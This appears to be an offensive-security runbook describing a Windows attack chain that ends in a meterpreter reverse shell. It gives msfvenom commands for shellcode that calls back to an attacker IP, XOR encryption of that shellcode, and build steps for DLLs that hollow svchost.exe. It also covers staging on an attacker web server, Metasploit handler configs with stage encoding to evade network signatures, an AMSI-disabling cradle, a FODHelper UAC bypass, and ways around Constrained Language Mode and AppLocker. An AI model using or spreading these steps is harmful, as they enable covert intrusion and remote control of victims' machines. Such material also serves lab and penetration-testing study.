# Attack Chain: Advanced Process Hollowing & In-Memory Reflection (Updated for x86 and x64)

> [!ABSTRACT]
> This document details a multi-stage, evasive attack chain designed to achieve a reverse shell on a hardened target. The chain utilizes XOR encryption, memory-only DLL reflection, heuristic sandbox evasion, and process hollowing of `svchost.exe`.
> 
> This attacks consists of creating 2 payloads, one for x86 (_on port 587_) and one for x64 (_on port 443_)

---

## Changing the IP-address used in the files

Go to the source of the folder containing all the files and run this.

```bash
# grep -rli 'ÇURRENT IP' * | xargs -i@ sed -i 's/ ÇURRENT IP/NEW IP/g' @
grep -rli '192.168.45.147' * | xargs -i@ sed -i 's/192.168.45.147/192.168.11.22/g' @
```

---

## 1. File Inventory and Purpose

| File                        | Type       | Description                                                                                                      |
| :-------------------------- | :--------- | :--------------------------------------------------------------------------------------------------------------- |
| [[HollowDLLx64.cs]]         | C# Source  | **(64 bits)** The core payload. A Class Library (.DLL) that performs evasion, decryption, and process hollowing. |
| [[HollowDLLx86.cs]]         | C# Source  | **(32 bits)** The core payload. A Class Library (.DLL) that performs evasion, decryption, and process hollowing. |
| [[ByPassExe.cs]]            | C# Source  | **(64 bits)** The backup payload for CLM Bypass (.EXE) that performs evasion, decryption, and process hollowing.               |
| [[HollowDLLx64Runner.cs]]   | C# Source  | **(64 bits)** A Executable that calls HollowDLLc64.dll from the webserver en Reflective Loads it in memory.      |
| [[HollowDLLx86Runner.cs]]   | C# Source  | **(32 bits)** A Executable that calls HollowDLLc64.dll from the webserver en Reflective Loads it in memory.      |
| [[create_XOR_shellcode.py]] | Python     | A helper script to XOR-encrypt msfvenom shellcode for use in `HollowDLLx64.cs` and `HollowDLLx86.cs`.            |
| [[run.ps1]]                 | PowerShell | The standard in-memory cradle. Disables AMSI and reflectively loads the DLL.                                     |
| [[run_elevated.ps1]]        | PowerShell | A UAC bypass script (_FODHelper_) that triggers the full chain in a High-Integrity context.                      |
| [[run.bat]]                 | Batch      | A dropper/wrapper that launches the PowerShell cradle silently.                                                  |
| [[cmd_oneliner.txt]]        | Text       | The raw command to trigger the entire attack from a simple CMD prompt.                                           |

---

## 2. Step-by-Step Execution Guide

### **Phase 1: Payload Generation (Kali)**

Generate raw 64-bit shellcode in C# format:
```bash
# Generate C# byte array for use in custom runners
sudo msfvenom -a x64 -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.49.147 LPORT=443 \
    PrependMigrate=True PrependMigrateProc=spoolsv.exe \
    EXITFUNC=thread -f csharp -o shellcode64.txt
```

Generate raw 32-bit shellcode in C# format:
```bash
# Generate C# byte array for use in custom runners
sudo msfvenom -a x86 -p windows/meterpreter/reverse_https \
    LHOST=192.168.49.147 LPORT=587 \
    PrependMigrate=True PrependMigrateProc=spoolsv.exe \
    EXITFUNC=thread -f csharp -o shellcode32.txt
```

### **Phase 2: Encryption**
Use the custom script to XOR-encrypt the shellcodes:
```bash
python3 create_XOR_shellcode.py -i shellcode64.txt > converted_shellcode64.txt
python3 create_XOR_shellcode.py -i shellcode32.txt > converted_shellcode32.txt
```

Copy the resulting `byte[] encryptedShellcode` array of each converted shellcode and paste it into [[HollowDLLx64.cs]] and [[HollowDLLx86.cs]].

### **Phase 3a: Compilation for 64 bit (Visual Studio)**
1.  Create a new **Class Library (.NET Framework)** project.
2.  Name this project HollowDLLx64.
3.  Set the platform target to **x64**.
4.  Paste the contents of [[HollowDLLx64.cs]] into the project.
5.  Enter the converted shellcode of the 64 bit architecture. _(Starts with: 0xcf, 0x8c, **0xbe,**...)_
6.  Build the project to generate `HollowDLLx64.dll`.

### **Phase 3b: Compilation for 32 bit (Visual Studio)**
1.  Create a new **Class Library (.NET Framework)** project.
2.  Name this project HollowDLLx86.
3.  Set the platform target to **x86**.
4.  Paste the contents of [[HollowDLLx86.cs]] into the project.
5.  Enter the converted shellcode of the 32 bit architecture. _(Starts with: 0xcf, 0x8c, **0xfd,** ...)_
6.  Build the project to generate `HollowDLLx86.dll`.

### **Phase 4: Staging and Execution**
1.  Host `HollowDLLx32.dll`, `HollowDLLx64.dll` and [[run.ps1]] on your attacker web server.
2.  Update the IP address in [[run.ps1]], [[run_elevated.ps1]], and [[run.bat]].
3.  Trigger the attack on the victim using your preferred method (e.g., [[run.bat]]).

### **Phase 5: Receive Shell**

[[64-bit Staged Receivers]]

1.  This the code:
```text
# Select the multi/handler module
use multi/handler

# Set the payload to match the one generated by msfvenom
set payload windows/x64/meterpreter/reverse_https 

# Set the listening host (Attacker IP)
set LHOST tun0

# Set the listening port
set LPORT 443 

# Configure automatic migration to a trusted process
set PrependMigrate True 
set PrependMigrateProc spoolsv.exe

# Enable Stage Encoding to bypass network-based signature analysis
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic

# Ensure the process runs in a new thread for stability
set EXITFUNC thread

# Keep the session open for other shells
set ExitOnSession false

# Start the listener
exploit -j
```


[[32-bit Staged Receivers]]

1.  This the code:
```text
# Select the multi/handler module
use multi/handler

# Set the payload to match the one generated by msfvenom
set payload windows/meterpreter/reverse_https 

# Set the listening host (Attacker IP)
set LHOST tun0

# Set the listening port
set LPORT 587

# Configure automatic migration to a trusted process
set PrependMigrate True 
set PrependMigrateProc spoolsv.exe

# Ensure the process runs in a new thread for stability
set EXITFUNC thread

# Keep the session open for other shells
set ExitOnSession false

# Start the listener
exploit -j
```

---

## 3. Handling Defensive Constraints

### **Case A: PowerShell Policy Prevents Script Execution**
If you see the error: *"Script.ps1 cannot be loaded because running scripts is disabled on this system."*
*   **The Solution:** Use the **In-Memory Cradle** (IEX). This method does not require a local `.ps1` file and bypasses the execution policy because it executes strings directly in memory.
*   **Command:** Use the string found in [[cmd_oneliner.txt]].

### **Case B: PowerShell is in Constrained Language Mode (CLM)**
CLM is common when AppLocker is enabled. It restricts access to the .NET Reflection API (`[Assembly]::Load`), which breaks [[run.ps1]].
*   **The Identification:** Run `$ExecutionContext.SessionState.LanguageMode` in PowerShell. If it says `ConstrainedLanguage`, your reflective load will fail.
*   **The Solution:** Use a **Custom C# Runspace**. 
    1. Instead of starting the attack with a `.ps1` script, use a compiled `.exe` (like the [[BypassExe.cs]])  or use a CLM Bypass ([[CLM]])
    2. Check the Certutil on how to do the attack. ([[Certutil]])
    3. These runners host the PowerShell engine inside a C# process, which defaults to `FullLanguage` mode regardless of system-wide AppLocker policies.
    4. Use the Uninstall Method for the implementation details.

---

## 4. Technical Deep Dive: Process Hollowing
The [[HollowDLL.cs]] payload performs the following sequence:
1.  **Suspended Spawn:** It calls `CreateProcess` with flag `0x4` to start `svchost.exe` but pauses it before the first instruction.
2.  **PEB Parsing:** It uses `ZwQueryInformationProcess` to find the **Process Environment Block (PEB)**. It then reads the PEB to find the `ImageBaseAddress`.
3.  **PE Header Resolution:** It parses the Image Base to find the **AddressOfEntryPoint** RVA (Relative Virtual Address).
4.  **Overwrite:** It uses `WriteProcessMemory` to replace the legitimate `svchost` EntryPoint with your XOR-decrypted shellcode.
5.  **Resume:** `ResumeThread` is called, and the process starts running your Meterpreter shell while appearing completely legitimate in the Task Manager.
